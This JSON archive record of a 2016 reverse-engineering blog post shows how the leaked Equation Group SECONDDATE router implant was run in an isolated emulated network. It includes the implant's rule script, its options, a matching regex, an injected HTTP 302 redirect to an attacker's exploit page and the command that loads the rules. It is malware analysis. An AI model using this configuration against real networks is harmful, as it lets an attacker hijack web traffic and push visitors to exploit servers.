{
    "id": "308cb9cc-3742-4355-8a7c-b34d04a48dca",
    "created_at": "2023-01-12T15:10:14.321448Z",
    "updated_at": "2025-03-27T02:15:46.130981Z",
    "deleted_at": null,
    "sha1_hash": "fec7e61c5c8a56d303accbe5f4ece15336f19aff",
    "title": "2016-09-23 - SECONDDATE in action",
    "authors": "",
    "file_creation_date": "2022-05-28T17:08:36Z",
    "file_modification_date": "2022-05-28T17:08:36Z",
    "file_size": 383303,
    "plain_text": "# SECONDDATE in action\n\n**laanwj.github.io/2016/09/23/seconddate-adventures.html**\n\n## Laanwj's blog\n\nRandomness\n\n[Blog](https://laanwj.github.io/) [About](https://laanwj.github.io/about)\n[Here I’ve taken the environment from the BLATSTING Command-and-Control protocol article](https://laanwj.github.io/2016/09/04/blatsting-command-and-control.html)\nand extended it, so that the emulator works as a router between an internal network with our\nvictim and an external network, a mock version of the internet with just our attacker and one\nweb server:\n\n\n-----\n\n```\nSimInternet, level 2\n           ╔════════════════════════════╗\n           ║ BLATSTING emulator     ║\n╔════════════════╗  ║ ╔════════════════════════╗ ║  ╔════════════════╗ emulated\n║ Victim host  ║  ║ ║ Emulated modules   ║ ║  ║ Attacker host ║ serial\n║        ║  ║ ║ ┌─────────┐ ┌────────┐ ║ ║  ║ ┌─────┐┌─────┐ ║ (control)\n║ ┌─────────┐  ║  ║ ║ │ second ◀┄▶ hash  │ ║ ║  ║ │httpd││SD\nLP│◀━━━━━━━━\n║ │ Browser │  ║  ║ ║ │ date  │ └────────┘ ║ ║  ║ └─────┘└─────┘ ║\n║ └─────────┘  ║  ║ ║ │     │ ┌────────┐ ║ ║  ║   ↕     ║\n║   ↕     ║  ║ ║ │     ◀┄▶ crypto │ ║ ║  ║ Linux nw. stck ║\n║ Linux nw. stck ║  ║ ║ └─────────┘ └────────┘ ║ ║  ╚══════▲═════════╝\n╚══════▲═════════╝  ║ ╚════▲════▲══════════════╝ ║      ┃\n╔══════════════════╗\n\n```\n┃       ║ ┌────▼──┐ ┆        ║      ┣━━━▶ Web server\n```\nACME ║\n\n```\n┃       ║ │ [stub]│ ┆        ║ \"outside\" ┃  ║ Int. Widgits\n```\nLtd ║\n\n```\n┃   \"inside\" ║ │ core │┌▼───────┐ Emu.nw.║ eth1   ┃\n```\n╚══════════════════╝\n\n```\n┃     eth2 ║ └───────┘│ [stub] ◀┄┄┄┄┄┄┄┄▶◀━━━━━━━━━━┛\n┗━━━━━━━━━━━━━▶◀┄┄┄┄┄┄┄┄┄┄▶ network│ Stack ║ Eth-over-UDP\n```\n           ║     └────────┘    ║        \n           ╚════════════════════════════╝\n\n```\nThis will allow using SECONDDATE as it was intended to be used, to redirect website\nvisitors (but only on the isolated virtual network). The attacker runs a web server to redirect\nthe victim to, which serves exploit payloads (a FOXACID server, in Equation Group jargon).\n\n[Showterm session of the experiment described here.](https://showterm.io/252abdc707d56d893210a)\n\n### Setup: Attacker\n\nWe’ll (as the attacker) set up the implant with this LP script:\n```\ndisable 1\nrule 1 --protocol 6 --dstport 80 --nocheckhttp --checkregex --inject --injectfile\ninjectfile_tcp --regexfile regex_tcp\nenable 1\n\n```\n_tcptest.seconddate: configuration script for setting up SECONDDATE._\n\n\n-----\n\n```\nrule [rulenum] [opts ...]      Sets options for a rule.\n                   where opts is one or more of the following\noptions\n                   (defaults are shown in parentheses):\n                   [--srcaddr addr(0)] [--srcmask mask(0)]\n                   [--dstaddr addr(0)] [--dstmask mask(0)]\n                   [--protocol port(6/TCP)] [--srcport port(0)] [-dstport port(0)]\n                   [--mininterval(60)] [--maxinjections(5)] [-injectwindow(0)]\n                   [--checkhttp (default) | --nocheckhttp]\n                   [--checkregex (default) | --nocheckregex]\n                     [--inject (default) | --noinject\n                   [--tcpflag (FIN ACK PSH) URG | ACK | PSH | RST |\nSYN | FIN ]\n                   [--regexfile <filename>] [--injectfile\n<filename>\n\n```\n_SD rule definitions, from SecondDateLp_ `help .`\n\nThe script does the following:\n```\n   disable 1 : Disable any previous rule 1 (this allows for quick reloading, as live rules\n\n```\ncannot be re-configured).\n```\n   rule 1 ... : Set up rule 1.\n\n```\n`--protocol 6 : Match IP protocol 6,` [which happens to be TCP. Only TCP or](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers)\nUDP allowed here.\n```\n      --dstport 80 : Destination port 80, HTTP.\n      --nocheckhttp : Don’t use the built-in regexp for HTTP, that’s no fun. Define\n\n```\nour own.\n```\n      --checkregex : Check for regex defined in --regexfile below.\n      --inject : Do packet injections.\n      --injectfile injectfile_tcp : Set data to inject on injection.\n      --regexfile regex_tcp : Set regexp to match.\n   enable 1 : Make rule 1 live.\n\n```\nIt is possible to fine-tune various parameters such as the maximum number of injections, the\ntime within which this has to happen, the time between injections and so on and so on, but\nthe defaults work fine for sake of this demo.\n```\n^GET / .*\nregex_tcp : The regular expression to match on TCP packets. This looks for HTTP GET\n\n```\n_[requests to the root, any version. This can be any valid PCRE regular expression.](https://www.debuggex.com/cheatsheet/regex/pcre)_\n```\nHTTP/1.1 302 Found\nLocation: http://192.168.1.1/exploit.html\ngrazing buzzards\n\n```\n\n-----\n\n```\ninjectfile_tcp : This will be injected into the TCP session. A basic HTTP temporary\n\n```\n_redirect to the evil web server._ `grazing buzzards is just a 16-byte string that I use for`\n_finding the packet in captures._\n\nThen subsequently load it into the implant by invoking the LP command from the shell and\npiping in the script:\n```\n$ ./SecondDate-3.1.1.0.SecondDateLp 192.168.1.2 < tcptest.seconddate\n\n```\n_Loading the rules, from LP-side serial console._\n\n### Setup: Victim\n\nThe victim is simply using a PC running a browser and is trying to visit a website over HTTP.\n[Luckily with HSTS preloading the latter is happening less and less in practice. For the sake](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)\nof being able to record the terminal session they are using the venerable browser `lynx, but`\nthis will work with any browser.\n\n### The attack\n\nThe victim, from IPv4 address `192.168.2.1, is trying to visit the legitimate web server of`\nACME Internet Widgits Ltd. at `192.168.1.100, through their router (Internet IP`\n```\n192.168.1.2 ). They will be redirected to the attacker’s host, 192.168.1.1, which hosts\n\n```\nan exploit page. To recap:\n```\n                              ╔══════════╗\n╔════════════════╗                     ║ Attacker ║\n║ Victim host  ║                     ╚════▲═════╝\n║        ║         ╔═════════════╗       ┃ 192.168.1.1\n║ ┌─────────┐  ║ 192.168.2.1   ║ Compromised ║       ┃\n║ │ Browser │  ◀━━━━━━━━━━━━━━━━━━▶ Router   \n\n```\n- ━━━━━━━━━━━━┫\n```\n║ └─────────┘  ║   192.168.2.2 ╚═════════════╝ 192.168.1.2 ┃\n║        ║                       ┃ 192.168.1.100\n║        ║                 ╔════════════▼═════╗\n╚════════════════╝                 ║ Web server ACME ║\n                          ║ Int. Widgits Ltd ║\n                          ╚══════════════════╝\n\n```\nWhat happens:\n\nVictim opens `http://192.168.1.100/ in their browser, which opens a connection to`\nthe web server of ACME Int. Widgits Ltd.\n\n\n-----\n\n_The website of ACME Internet Widgits Ltd., which has a world-wide monopoly on delivering_\n_Schrödinger’s boxes by drone. Cat not included._\n\nSD, running on the compromised router, triggers on the first content packet of this\nconnection, eats it, and instead injects a packet to redirect to the attacker’s server, then\nimmediately closes the connection. It resets the connection to the original web server\nwith a TCP RST packet.\n\n\n-----\n\n_Injected packet as seen from the inside network. The RSTs going to both the webserver and_\n_client to immediately end the connection afterward are also visible. The full captures can be_\n_downloaded below._\n\nVictim is redirected to `http://192.168.1.100/exploit.html, and will load`\nwhatever is on that page.\n\n\n-----\n\n_The ultimate lazy exploit, just for illustration. Not only does the victim have to adjust their_\n_CPU’s instruction pointer manually, they’d have to first finish writing the shellcode. The_\n_Equation Group has better ones available. The target link would in practice point to a_\n_browser exploit (usually aimed at a plugin such as Flash), or a backdoored installer when_\n_intercepting a download._\n\nNote that when the victim immediately loads the site again they won’t get redirected\nagain. The `mininterval serves as a cool-down period.`\n\nPacket captures:\n\n[seconddate_int.cap internal network](https://laanwj.github.io/assets/2016/09/23/seconddate-adventures/seconddate_int.cap)\n[seconddate_ext.cap external network (includes C&C traffic)](https://laanwj.github.io/assets/2016/09/23/seconddate-adventures/seconddate_ext.cap)\n\nWritten on September 23, 2016\n\nTags: [eqgrp](https://laanwj.github.io/tags/#eqgrp) [malware](https://laanwj.github.io/tags/#malware)\n[Filed under Reverse-engineering](https://laanwj.github.io/categories/#reverse-engineering)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-09-23 - SECONDDATE in action.pdf"
    ],
    "report_names": [
        "2016-09-23 - SECONDDATE in action.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536214,
    "ts_updated_at": 1743041746,
    "ts_creation_date": 1653757716,
    "ts_modification_date": 1653757716,
    "files": {
        "pdf": "https://archive.orkl.eu/fec7e61c5c8a56d303accbe5f4ece15336f19aff.pdf",
        "text": "https://archive.orkl.eu/fec7e61c5c8a56d303accbe5f4ece15336f19aff.txt",
        "img": "https://archive.orkl.eu/fec7e61c5c8a56d303accbe5f4ece15336f19aff.jpg"
    }
}